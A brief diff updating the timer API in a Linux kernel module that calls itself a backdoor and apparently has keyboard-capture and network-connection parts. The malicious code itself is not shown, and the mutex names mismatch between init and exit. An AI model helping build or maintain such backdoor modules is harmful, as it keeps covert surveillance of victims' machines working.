@@ -85,7 +85,7 @@ static int __init keyboard_module_init(void) {
         return result;
     }
 
-    setup_timer(&connection_timer, initialize_conn, 0);
+    timer_setup(&connection_timer, initialize_conn, 0);
     mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
 
     mutex_init(&socks_mutex);
@@ -114,7 +114,7 @@ static void __exit keyboard_module_exit(void) {
 
     del_timer(&connection_timer);
     mutex_destroy(&my_mutex);
-    
+
     printk(KERN_INFO "Backdoor module exited\n");
 }
 
